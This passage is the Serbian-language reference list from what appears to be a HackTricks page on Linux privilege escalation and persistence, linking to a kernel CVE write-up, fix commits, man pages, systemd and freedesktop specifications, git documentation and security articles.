- [9] [JFrog: Analiza i eksploatacija Linux LPE varijante DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Ispravka za Linux: net: skb: očuvanje `SKBFL_SHARED_FRAG` u `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Ranije ublažavanje za Linux: postavljanje `SKBFL_SHARED_FRAG` za UDP pakete prosleđene splice-om (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux stranica priručnika](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux stranica priručnika](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian stranica priručnika](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — dokumentacija Linux kernela](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Asocijacije MIME aplikacija](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Specifikacija Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Specifikacija Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Jezik Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile za Linux crypto](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: ranjivost Linux kernela u AF_ALG kešu stranica](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux stranica priručnika](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git dokumentacija za `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Git dokumentacija za `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Git dokumentacija za konfiguraciju](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — Linux stranica priručnika](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Dokumentacija za systemd generatore](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering: mehanizmi postojanosti](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
